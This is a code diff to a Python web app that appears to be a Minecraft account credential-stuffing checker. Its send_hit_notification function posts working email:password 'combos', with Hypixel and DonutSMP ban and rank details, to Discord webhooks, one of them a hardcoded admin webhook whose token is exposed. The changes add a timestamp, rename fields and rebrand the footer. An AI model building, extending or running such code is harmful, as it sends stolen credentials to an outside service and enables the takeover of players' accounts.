@@ -6,6 +6,7 @@ import traceback
 import validator
 import os
 import requests
+from datetime import datetime, timezone, timedelta
 
 ADMIN_WEBHOOK_URL = "https://discord.com/api/webhooks/1564304903248154665/c6FYMr5O3jMEwuF0-5gpJq7oLG2GFSqg0ZDckCPXLkpMdmen3GEYLY-4fGYvrrYLnzEA"
 
@@ -21,8 +22,12 @@ jobs = {}
 jobs_lock = threading.Lock()
 
 def send_hit_notification(email, password, account_type="Minecraft Java", capes="None", hypixel_level="N/A", hypixel_rank="N/A", donut_status="Unbanned", donut_reason="None", donut_time="None", donut_money="N/A", donut_playtime="N/A", user_webhook_url=None):
-    hypixel_stats_block = f"Rank: {hypixel_rank}\nLevel: {hypixel_level}"
-    donut_stats_block = f"Status: {donut_status}\nReason: {donut_reason}\nTime Left: {donut_time}\nMoney: {donut_money}\nPlaytime: {donut_playtime}"
+    # IST Timezone (UTC +5:30) correction for accurate local time
+    ist_offset = timezone(timedelta(hours=5, minutes=30))
+    current_time = datetime.now(ist_offset).strftime('%Y-%m-%d %H:%M:%S')
+
+    hypixel_stats_block = f"Status: {hypixel_rank}\nReason: {hypixel_level}"
+    donut_stats_block = f"Status: {donut_status}\nReason: {donut_reason}"
 
     payload = {
         "username": "Demon V2 Hits Bot",
@@ -33,12 +38,13 @@ def send_hit_notification(email, password, account_type="Minecraft Java", capes=
                     {"name": "🔑 Email", "value": f"||`{email}`||", "inline": False},
                     {"name": "🔑 Password", "value": f"||`{password}`||", "inline": False},
                     {"name": "🦊 Type", "value": account_type, "inline": True},
-                    {"name": "📊 Hypixel Stats", "value": f"```\n{hypixel_stats_block}\n```", "inline": False},
-                    {"name": "🍩 DonutSMP Stats", "value": f"```\n{donut_stats_block}\n```", "inline": False},
                     {"name": "🧥 Capes", "value": capes if capes else "None", "inline": True},
+                    {"name": "❄️ Hypixel Status", "value": f"```\n{hypixel_stats_block}\n```", "inline": False},
+                    {"name": "🍩 DonutSMP Status", "value": f"```\n{donut_stats_block}\n```", "inline": False},
+                    {"name": "⏰ Timestamp", "value": f"`{current_time}`", "inline": False},
                     {"name": "🔑 Combo", "value": f"||`{email}:{password}`||", "inline": False},
                 ],
-                "footer": {"text": "Nexus V2 • Powered by Demon (@n8x3)"},
+                "footer": {"text": "Demon Checker Services • Powered by Demon (@n8x3)"},
             }
         ]
     }
@@ -147,3 +153,4 @@ def download_result(folder, filename):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=7860, debug=True)
+    
